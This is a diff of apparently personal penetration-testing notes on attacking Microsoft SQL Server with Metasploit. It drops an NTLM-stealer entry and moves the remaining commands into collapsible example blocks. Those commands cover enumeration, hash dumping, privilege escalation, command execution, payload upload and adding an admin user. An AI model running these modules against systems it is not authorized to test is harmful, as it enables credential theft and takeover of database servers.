@@ -243,86 +243,77 @@ msf > use auxiliary/scanner/mssql/mssql_login
 <!-- With Credentials {{{-->
 ### With Credentials
 
-> [!tip]
->
-> Set `USERNAME`, `RHOSTS` and `PASSWORD`
->
-> Set `DOMAIN` and `USE_WINDOWS_AUTHENT` if domain is used
-
-
-Microsoft SQL Server NTLM Stealer
-([mssql_ntlm_stealer](https://www.rapid7.com/db/modules/auxiliary/admin/mssql/mssql_ntlm_stealer/))
-
-```sh
-msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
-```
-
-> [!warning]
->
-> Run Responder before executing
-
-Enumeration
-
-- `auxiliary/admin/mssql/mssql_exec`
-- `auxiliary/admin/mssql/mssql_enum`
-- `auxiliary/admin/mssql/mssql_sql`
-
 Info gathering
 
-```sh
-msf> use admin/mssql/mssql_enum #Security checks
-```
-```sh
-msf> use admin/mssql/mssql_enum_domain_accounts
-```
-```sh
-msf> use admin/mssql/mssql_enum_sql_logins
-```
-```sh
-msf> use auxiliary/admin/mssql/mssql_findandsampledata
-```
-```sh
-msf> use auxiliary/scanner/mssql/mssql_hashdump
-```
-```sh
-msf> use auxiliary/scanner/mssql/mssql_schemadump
-```
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> msf> use admin/mssql/mssql_enum
+> ```
+> ```sh
+> msf> use admin/mssql/mssql_enum_domain_accounts
+> ```
+> ```sh
+> msf> use admin/mssql/mssql_enum_sql_logins
+> ```
+> ```sh
+> msf> use auxiliary/admin/mssql/mssql_findandsampledata
+> ```
+> ```sh
+> msf> use auxiliary/scanner/mssql/mssql_hashdump
+> ```
+> ```sh
+> msf> use auxiliary/scanner/mssql/mssql_schemadump
+> ```
+> ```sh
+> msf> use auxiliary/admin/mssql/mssql_sql
+> ```
+<!-- }}} -->
 
 Search for insteresting data
 
-```sh
-msf> use auxiliary/admin/mssql/mssql_findandsampledata
-```
-```sh
-msf> use auxiliary/admin/mssql/mssql_idf
-```
+> [!example]-
+>
+> ```sh
+> msf> use auxiliary/admin/mssql/mssql_findandsampledata
+> ```
+> ```sh
+> msf> use auxiliary/admin/mssql/mssql_idf
+> ```
 
 Privesc
 
-```sh
-msf> use exploit/windows/mssql/mssql_linkcrawler
-```
-```sh
-msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
-```
-```sh
-msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin
-```
+> [!example]-
+>
+> ```sh
+> msf> use exploit/windows/mssql/mssql_linkcrawler
+> ```
+> ```sh
+> msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
+> ```
+> ```sh
+> msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin
+> ```
 
 Code execution
 
-```sh
-msf> use admin/mssql/mssql_exec #Execute commands
-```
-```sh
-msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload
-```
+> [!example]-
+>
+> ```sh
+> msf> use admin/mssql/mssql_exec #Execute commands
+> ```
+> ```sh
+> msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload
+> ```
 
 Add new admin user from meterpreter session
 
-```sh
-msf> use windows/manage/mssql_local_auth_bypass
-```
+> [!example]-
+>
+> ```sh
+> msf> use windows/manage/mssql_local_auth_bypass
+> ```
 
 <!-- }}} -->
 
